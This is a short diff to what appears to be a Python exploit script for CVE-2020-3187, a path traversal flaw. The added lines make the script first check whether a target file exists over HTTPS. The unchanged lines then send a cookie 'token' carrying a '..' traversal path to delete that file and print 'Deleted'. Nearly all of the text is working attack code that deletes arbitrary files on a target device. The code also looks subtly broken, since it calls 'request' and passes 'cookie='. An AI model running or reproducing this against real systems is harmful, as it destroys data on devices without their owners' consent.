@@ -92,6 +92,11 @@ def cve_2020_3187(host, port):
 		break
 	    if data[0] != '/':
 		data = '/'+data
+	    turl = 'https://%s%s%s' % (host, port, data)
+	    tr = request.get(turl, verify=False)
+	    if tr.status_code == 404:
+		print('File does not exist')
+		continue
 	    COOKIE = {'token' : '..%s' % data}
 	    r = request.get(url, verify=False, cookie=COOKIE)
 	    print('Deleted %s' % data)
